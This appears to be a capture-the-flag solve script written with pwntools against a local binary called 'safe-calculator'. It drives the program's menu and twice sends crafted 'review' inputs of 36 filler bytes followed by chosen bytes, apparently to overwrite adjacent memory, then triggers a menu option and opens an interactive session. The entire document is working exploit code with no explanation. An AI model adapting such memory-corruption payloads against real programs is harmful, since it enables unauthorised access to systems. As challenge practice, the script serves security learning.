from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('safe-calculator')

p = elf.process()
#gdb.attach(p)

p.sendlineafter(b">", b"2")
payload = b"A" * 36 + b'X' * 8 + b'A.ZX'
p.sendlineafter(b"Leave a review! : ", payload)
p.sendlineafter(b">", b"2")
payload = b"A" * 36 + b'712aXXXX'
p.sendlineafter(b"Leave a review! : ", payload)
p.sendlineafter(b">", b"1")

p.interactive()
